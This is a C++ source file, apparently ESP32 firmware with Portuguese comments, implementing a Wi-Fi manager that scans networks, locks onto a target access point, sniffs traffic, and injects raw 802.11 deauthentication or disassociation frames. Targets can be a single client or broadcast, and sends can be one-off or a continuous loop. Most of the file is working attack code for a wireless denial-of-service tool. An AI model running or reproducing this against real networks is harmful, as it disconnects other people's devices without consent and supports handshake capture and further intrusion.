#include "wifi_manager.h"
#include "deauth_frame_builder.h"
#include <esp_wifi.h>
#include <cstring>
#include <cstdio>

static const int kLoopFramesPerTick = 4;  // frames por tick do loop de deauth

void WifiManager::begin() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  // Desliga o power save: em STA sem conexao o radio dorme e a maioria dos
  // frames injetados (deauth) nem sai. WIFI_PS_NONE mantem o radio acordado.
  esp_wifi_set_ps(WIFI_PS_NONE);
  delay(100);
}

int WifiManager::scan() {
  stopDeauthLoop();
  stopSniff();  // senao o radio fica preso no canal antigo, promiscuo, mas "esquecido" no estado
  int n = WiFi.scanNetworks();
  count_ = n > 0 ? n : 0;
  state_ = WifiState::IDLE;
  return n;
}

static bool validIndex(int index, int count) { return index >= 1 && index <= count; }

String WifiManager::ssidAt(int index) const {
  return validIndex(index, count_) ? WiFi.SSID(index - 1) : String("");
}

int WifiManager::rssiAt(int index) const {
  return validIndex(index, count_) ? WiFi.RSSI(index - 1) : 0;
}

bool WifiManager::secureAt(int index) const {
  return validIndex(index, count_) && WiFi.encryptionType(index - 1) != WIFI_AUTH_OPEN;
}

String WifiManager::bssidAt(int index) const {
  if (!validIndex(index, count_)) return String("");
  uint8_t *b = WiFi.BSSID(index - 1);
  if (!b) return String("");
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
  return String(buf);
}

int WifiManager::channelAt(int index) const {
  return validIndex(index, count_) ? WiFi.channel(index - 1) : 0;
}

String WifiManager::encryptionAt(int index) const {
  if (!validIndex(index, count_)) return String("unknown");
  switch (WiFi.encryptionType(index - 1)) {
    case WIFI_AUTH_OPEN: return "open";
    case WIFI_AUTH_WEP: return "wep";
    case WIFI_AUTH_WPA_PSK: return "wpa_psk";
    case WIFI_AUTH_WPA2_PSK: return "wpa2_psk";
    case WIFI_AUTH_WPA_WPA2_PSK: return "wpa_wpa2_psk";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "wpa2_enterprise";
    case WIFI_AUTH_WPA3_PSK: return "wpa3_psk";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "wpa2_wpa3_psk";
    case WIFI_AUTH_WAPI_PSK: return "wapi_psk";
    default: return "unknown";
  }
}

int WifiManager::indexForSsid(const String &ssid) const {
  for (int i = 1; i <= count_; i++) {
    if (ssidAt(i) == ssid) return i;
  }
  return 0;
}

bool WifiManager::connect(const String &ssid, const String &pass, uint32_t timeoutMs) {
  stopDeauthLoop();
  stopSniff();
  WiFi.disconnect();
  state_ = WifiState::CONNECTING;
  WiFi.begin(ssid.c_str(), pass.c_str());
  uint32_t start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < timeoutMs) {
    delay(250);
  }
  bool ok = connected();
  state_ = ok ? WifiState::CONNECTED : WifiState::IDLE;
  return ok;
}

void WifiManager::disconnect() {
  stopDeauthLoop();
  WiFi.disconnect();
  state_ = WifiState::IDLE;
}

bool WifiManager::lockChannel(int index) {
  if (!validIndex(index, count_)) return false;
  stopDeauthLoop();
  stopSniff();
  uint8_t *b = WiFi.BSSID(index - 1);
  if (!b) return false;
  memcpy(lockedBssid_, b, 6);
  lockedSsid_ = ssidAt(index);
  lockedChannel_ = WiFi.channel(index - 1);
  esp_wifi_set_channel((uint8_t)lockedChannel_, WIFI_SECOND_CHAN_NONE);
  state_ = WifiState::LOCKED;
  return true;
}

String WifiManager::lockedBssidString() const {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           lockedBssid_[0], lockedBssid_[1], lockedBssid_[2],
           lockedBssid_[3], lockedBssid_[4], lockedBssid_[5]);
  return String(buf);
}

void WifiManager::unlock() {
  stopDeauthLoop();
  stopSniff();
  state_ = WifiState::IDLE;
}

void WifiManager::startSniff(const SniffConfig &cfg) {
  if (state_ != WifiState::LOCKED && state_ != WifiState::SNIFFING) return;
  sniffer_.begin(lockedBssid_, lockedSsid_, cfg);
  state_ = WifiState::SNIFFING;
}

void WifiManager::stopSniff() {
  if (state_ == WifiState::SNIFFING) {
    sniffer_.end();
    state_ = WifiState::LOCKED;
  }
}

static bool parseMac(const String &s, uint8_t out[6]) {
  if (s.equalsIgnoreCase("broadcast")) {
    memset(out, 0xFF, 6);
    return true;
  }
  if (s.length() != 17) return false;
  unsigned int values[6];
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) != 6) {
    return false;
  }
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)values[i];
  return true;
}

bool WifiManager::sendDeauth(const String &target, uint16_t reason, const String &frameType,
                             uint16_t count) {
  if (state_ != WifiState::LOCKED && state_ != WifiState::SNIFFING) {
    Serial.printf("[deauth] recusado: estado atual e '%s', precisa estar locked/sniffing\n",
                  stateName().c_str());
    return false;
  }

  uint8_t mac[6];
  if (!parseMac(target, mac)) {
    Serial.printf("[deauth] recusado: target invalido '%s'\n", target.c_str());
    return false;
  }
  if (count < 1) count = 1;

  uint8_t fc0 = frameType == "disassoc" ? DeauthFrameBuilder::kFrameControlDisassoc
                                         : DeauthFrameBuilder::kFrameControlDeauth;
  uint8_t frame[26];
  DeauthFrameBuilder::build(mac, lockedBssid_, reason, frame, fc0);

  // Injecao de frame cru so drena a fila de TX com o promiscuo ligado. Em LOCKED
  // ele esta desligado; liga pro envio e restaura depois. Se ja estamos sniffando
  // ou com o loop rodando, o promiscuo ja esta ligado.
  esp_wifi_set_ps(WIFI_PS_NONE);
  bool alreadyPromiscuous = (state_ == WifiState::SNIFFING) || deauthLoopActive_;
  if (!alreadyPromiscuous) esp_wifi_set_promiscuous(true);

  uint16_t ok = 0;
  for (uint16_t i = 0; i < count; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true) == ESP_OK) ok++;
    delay(1);
  }

  if (!alreadyPromiscuous) esp_wifi_set_promiscuous(false);

  Serial.printf("[deauth] type=%s target=%s bssid=%s reason=%u | enviados %u de %u\n",
                frameType.c_str(), target.c_str(), lockedBssidString().c_str(), reason, ok, count);
  return ok > 0;
}

bool WifiManager::startDeauthLoop(const String &target, uint16_t reason,
                                 const String &frameType, uint32_t intervalMs) {
  if (state_ != WifiState::LOCKED && state_ != WifiState::SNIFFING) return false;
  uint8_t mac[6];
  if (!parseMac(target, mac)) return false;

  stopSniff();  // o loop cuida do promiscuo sozinho, sem callback de RX
  memcpy(loopTarget_, mac, 6);
  loopReason_ = reason;
  loopFc0_ = frameType == "disassoc" ? DeauthFrameBuilder::kFrameControlDisassoc
                                     : DeauthFrameBuilder::kFrameControlDeauth;
  loopIntervalMs_ = intervalMs < 20 ? 20 : intervalMs;  // piso pra nao sufocar o loop()
  loopSentTotal_ = 0;
  lastLoopSend_ = 0;

  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(true);  // fica ligado o loop todo pra drenar a fila de TX
  deauthLoopActive_ = true;
  Serial.printf("[deauth_loop] iniciado: target=%s bssid=%s intervalo=%ums\n",
                target.c_str(), lockedBssidString().c_str(), (unsigned)loopIntervalMs_);
  return true;
}

void WifiManager::stopDeauthLoop() {
  if (!deauthLoopActive_) return;
  deauthLoopActive_ = false;
  esp_wifi_set_promiscuous(false);
  Serial.printf("[deauth_loop] parado: %u frames enviados no total\n", (unsigned)loopSentTotal_);
}

String WifiManager::deauthLoopTargetString() const {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           loopTarget_[0], loopTarget_[1], loopTarget_[2],
           loopTarget_[3], loopTarget_[4], loopTarget_[5]);
  return String(buf);
}

void WifiManager::tick() {
  if (!deauthLoopActive_) return;
  if (millis() - lastLoopSend_ < loopIntervalMs_) return;
  lastLoopSend_ = millis();

  uint8_t frame[26];
  DeauthFrameBuilder::build(loopTarget_, lockedBssid_, loopReason_, frame, loopFc0_);
  for (int i = 0; i < kLoopFramesPerTick; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true) == ESP_OK) loopSentTotal_++;
    delay(1);
  }
}

String WifiManager::stateName() const {
  switch (state_) {
    case WifiState::IDLE: return "idle";
    case WifiState::SCANNING: return "scanning";
    case WifiState::CONNECTING: return "connecting";
    case WifiState::CONNECTED: return "connected";
    case WifiState::LOCKED: return "locked";
    case WifiState::SNIFFING: return "sniffing";
  }
  return "unknown";
}
